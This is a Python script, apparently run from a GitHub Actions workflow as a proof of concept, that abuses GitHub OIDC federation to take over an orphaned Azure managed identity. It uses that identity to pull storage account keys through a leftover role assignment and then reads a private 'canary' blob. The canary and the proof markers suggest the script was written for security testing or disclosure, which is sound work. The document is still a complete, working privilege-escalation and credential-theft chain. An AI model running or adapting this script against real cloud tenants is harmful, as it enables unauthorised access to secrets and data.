import json, base64, os, urllib.request, urllib.parse, urllib.error, subprocess

def claims(jwt):
    p = jwt.split('.')[1]; p += '=' * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))

print("=== NO azure/login, NO Azure credential/secret used; only GitHub Actions OIDC + repo identifiers ===")
CLIENT_ID = os.environ['CLIENT_ID']; TENANT_ID = os.environ['TENANT_ID']
SUB_ID = os.environ['SUB_ID']; STOR = os.environ['STOR']; RG = os.environ['RG']
print("CLIENT_ID_present=", bool(CLIENT_ID), "TENANT_ID_present=", bool(TENANT_ID), "SUB_ID_present=", bool(SUB_ID))

# 1) GitHub Actions OIDC token (aud = api://AzureADTokenExchange)
req_url = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=api://AzureADTokenExchange'
r = urllib.request.Request(req_url, headers={'Authorization': 'bearer ' + os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})
oidc = json.load(urllib.request.urlopen(r))['value']
print("OIDC_SUB=", claims(oidc).get('sub'))
print("OIDC_ISS=", claims(oidc).get('iss'), "OIDC_AUD=", claims(oidc).get('aud'))

# 2) exchange the OIDC assertion for the orphaned UAMI's ARM token
data = urllib.parse.urlencode({
    'grant_type': 'client_credentials', 'client_id': CLIENT_ID,
    'scope': 'https://management.azure.com/.default',
    'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
    'client_assertion': oidc}).encode()
tok_url = 'https://login.microsoftonline.com/%s/oauth2/v2.0/token' % TENANT_ID
try:
    resp = json.load(urllib.request.urlopen(urllib.request.Request(tok_url, data=data)))
except urllib.error.HTTPError as e:
    print("EXCHANGE_FAILED=", e.read().decode()[:400]); raise SystemExit(0)
arm = resp['access_token']
c = claims(arm)
print("ARM_TOKEN_OBTAINED oid=%s appid=%s aud=%s" % (c.get('oid'), c.get('appid'), c.get('aud')))

# 3) listKeys on the Sentinel-unrelated storage account (via surviving Logic App Contributor)
lk_url = 'https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s/listKeys?api-version=2023-01-01' % (SUB_ID, RG, STOR)
try:
    lk = json.load(urllib.request.urlopen(urllib.request.Request(lk_url, data=b'', headers={'Authorization': 'Bearer ' + arm})))
except urllib.error.HTTPError as e:
    print("LISTKEYS_FAILED=", e.read().decode()[:400]); raise SystemExit(0)
print("LISTKEYS_PERMISSIONS=", [k['permissions'] for k in lk['keys']])
key = lk['keys'][0]['value']
print("::add-mask::" + key)

# 4) use the recovered account key to read the private canary blob
subprocess.run(['az', 'storage', 'blob', 'download', '--account-name', STOR, '--account-key', key,
                '-c', 'canary', '-n', 'canary.txt', '-f', '/tmp/c.txt', '--only-show-errors'], check=False)
try:
    print("CANARY_BLOB_CONTENT=" + open('/tmp/c.txt').read())
except Exception as e:
    print("CANARY_READ_ERR=", e)
print("=== done ===")
